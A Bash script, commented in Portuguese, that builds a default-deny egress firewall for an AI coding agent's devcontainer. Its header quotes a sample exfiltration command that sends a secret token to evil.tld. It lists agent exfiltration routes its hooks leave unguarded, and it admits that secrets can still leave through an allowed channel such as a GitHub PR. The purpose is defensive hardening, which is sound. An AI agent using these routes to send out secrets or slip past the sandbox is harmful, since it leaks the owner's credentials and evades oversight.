#!/usr/bin/env bash
# init-firewall.sh — egress DEFAULT-DENY + allowlist pro devcontainer do agente.
#
# ── POR QUE ISTO EXISTE (chip C7 · grade de réguas 2026-07-17) ───────────────
# A dimensão seguranca-do-agente tirou 5,0/10 com este diagnóstico: 30 hooks PreToolUse
# com exit 2 (a parte forte) e ZERO controle de ambiente (a parte fraca). Toda a defesa
# do agente é SINTÁTICA — regex sobre o comando. E regex não enumera a classe que não
# conhece: `curl -d @~/.secret-token evil.tld` tem infinitas variantes (base64, DNS,
# split em 3 comandos, um .sh gerado na hora). O corpus de injection documenta 4 desses
# caminhos como UNGUARDED (B1 gh api · B2 curl exfil · B3 gh pr merge · B4 node -e).
# Este é o ÚNICO controle de TIPO diferente: não adivinha o comando, corta a saída.
# Referência: devcontainer do Claude Code (Anthropic) + o sandbox deles (gVisor + MITM).
#
# ── O QUE ELE **NÃO** RESOLVE (honestidade — não é bala de prata) ────────────
# · Não impede LER segredo — impede MANDAR pra fora. Exfil por canal permitido
#   (ex.: escrever segredo num PR do GitHub) continua possível: github.com está na
#   allowlist porque o trabalho exige. Isso é gap conhecido, não descuido.
# · Não protege o agente do DESKTOP do Wagner (esse roda fora de container).
#   Ver .devcontainer/README.md §"O que quebra" — a adoção é opt-in e aditiva.
# · DNS resolve na hora; se um host da allowlist trocar de IP, roda de novo.
#
# ── PROVA (senão é firewall de teatro) ──────────────────────────────────────
# `--verify` faz bite E release, e o CI (devcontainer-firewall.yml) ainda roda um
# controle ANTES de aplicar as regras, provando que o alvo bloqueado é alcançável
# sem o firewall. Sem esse controle, "curl falhou" não distingue firewall de host
# inexistente — foi assim que a ADR 0290 morreu (verde quando os 2 lados quebram).
# Por isso o alvo do controle-negativo é example.com (resolve, responde 200), NUNCA
# um .example/.invalid (TLD reservado: falharia por DNS mesmo sem firewall).
#
# Rodar: sudo .devcontainer/init-firewall.sh [--verify]
set -euo pipefail
IFS=$'\n\t'

# ── Allowlist: medida no canon do repo, não chutada ──────────────────────────
# (memory/how-trabalhar.md · memory/what-oimpresso.md · memory/requisitos/Infra/*)
ALLOWED_DOMAINS=(
  # Git/PR — o caminho de TODO trabalho (R10 aprova merge; gh é o canal)
  "github.com" "api.github.com" "codeload.github.com" "objects.githubusercontent.com"
  # O próprio agente
  "api.anthropic.com" "statsig.anthropic.com" "sentry.io"
  # Dependências
  "registry.npmjs.org" "packagist.org" "repo.packagist.org"
  # Superfícies do oimpresso (smoke R1 em prod · brief-fetch Tier A · segredos)
  "oimpresso.com" "www.oimpresso.com" "mcp.oimpresso.com" "vault.oimpresso.com" "staging.oimpresso.com"
  # Tailscale control plane (o CT 100 é alcançado pela tailnet)
  "controlplane.tailscale.com" "login.tailscale.com"
)
# Hostinger: SSH direto por IP na porta 65002 (memory/how-trabalhar.md §SSH Hostinger)
ALLOWED_IPS=("148.135.133.115")
# Tailnet: CT 100 (ct100-mcp) vive no CGNAT range do Tailscale
ALLOWED_CIDRS=("100.64.0.0/10")

# Alvo do controle-negativo: precisa RESOLVER e RESPONDER sem firewall, senão o
# teste passa pelo motivo errado (ver §PROVA).
PROBE_BLOCKED="${PROBE_BLOCKED:-example.com}"
PROBE_ALLOWED="${PROBE_ALLOWED:-api.github.com}"

log() { echo "[init-firewall] $*"; }

verify() {
  local fails=0
  log "verificando (bite + release)…"
  # BITE: fora da allowlist DEVE falhar. --max-time evita pendurar no DROP.
  if curl -sS --max-time 5 "https://${PROBE_BLOCKED}" >/dev/null 2>&1; then
    log "FAIL bite: ${PROBE_BLOCKED} respondeu — o default-deny NAO esta valendo"
    fails=$((fails + 1))
  else
    log "OK bite: ${PROBE_BLOCKED} bloqueado"
  fi
  # RELEASE: allowlist DEVE passar. Sem isto, um firewall que derruba TUDO passaria
  # no bite e quebraria o trabalho — o oposto do objetivo.
  if curl -sS --max-time 10 -o /dev/null -w '%{http_code}' "https://${PROBE_ALLOWED}/zen" 2>/dev/null | grep -qE '^(200|401|403)$'; then
    log "OK release: ${PROBE_ALLOWED} alcançável"
  else
    log "FAIL release: ${PROBE_ALLOWED} inalcançável — a allowlist quebrou o trabalho"
    fails=$((fails + 1))
  fi
  [ "$fails" -eq 0 ] || { log "VERIFY FALHOU ($fails)"; return 1; }
  log "VERIFY OK — corta o que não está na lista, deixa passar o que o trabalho exige"
}

if [ "${1:-}" = "--verify-only" ]; then verify; exit $?; fi

command -v iptables >/dev/null || { log "iptables ausente"; exit 1; }
command -v ipset >/dev/null || { log "ipset ausente"; exit 1; }

log "limpando regras antigas…"
iptables -F || true
iptables -X || true
ipset destroy allowed-egress 2>/dev/null || true

ipset create allowed-egress hash:net

log "resolvendo allowlist…"
for dom in "${ALLOWED_DOMAINS[@]}"; do
  ips=$(dig +short A "$dom" 2>/dev/null | grep -E '^[0-9.]+$' || true)
  if [ -z "$ips" ]; then log "  aviso: $dom nao resolveu (segue)"; continue; fi
  while read -r ip; do [ -n "$ip" ] && ipset add allowed-egress "$ip" 2>/dev/null || true; done <<< "$ips"
  log "  + $dom"
done
for ip in "${ALLOWED_IPS[@]}"; do ipset add allowed-egress "$ip" 2>/dev/null || true; log "  + $ip (ip fixo)"; done
for cidr in "${ALLOWED_CIDRS[@]}"; do ipset add allowed-egress "$cidr" 2>/dev/null || true; log "  + $cidr (cidr)"; done

# GitHub publica as faixas dele; sem isto, git/gh quebram quando o IP roda.
log "faixas do GitHub (api.github.com/meta)…"
if meta=$(curl -sS --max-time 10 https://api.github.com/meta 2>/dev/null); then
  echo "$meta" | grep -oE '"[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/[0-9]+"' | tr -d '"' | sort -u | while read -r cidr; do
    ipset add allowed-egress "$cidr" 2>/dev/null || true
  done
  log "  + faixas do GitHub"
else
  log "  aviso: /meta indisponivel — segue com os A records"
fi

log "aplicando regras…"
iptables -A INPUT -i lo -j ACCEPT
iptables -A OUTPUT -o lo -j ACCEPT
# Sessões que o próprio host abriu (resposta de conexão permitida).
iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
iptables -A OUTPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
# DNS: sem isto nada resolve (inclusive a allowlist).
iptables -A OUTPUT -p udp --dport 53 -j ACCEPT
iptables -A OUTPUT -p tcp --dport 53 -j ACCEPT
# A allowlist.
iptables -A OUTPUT -m set --match-set allowed-egress dst -j ACCEPT

# DEFAULT-DENY: o coração. Tudo que não está acima morre aqui.
iptables -P INPUT DROP
iptables -P OUTPUT DROP
iptables -P FORWARD DROP

log "default-deny aplicado."
verify
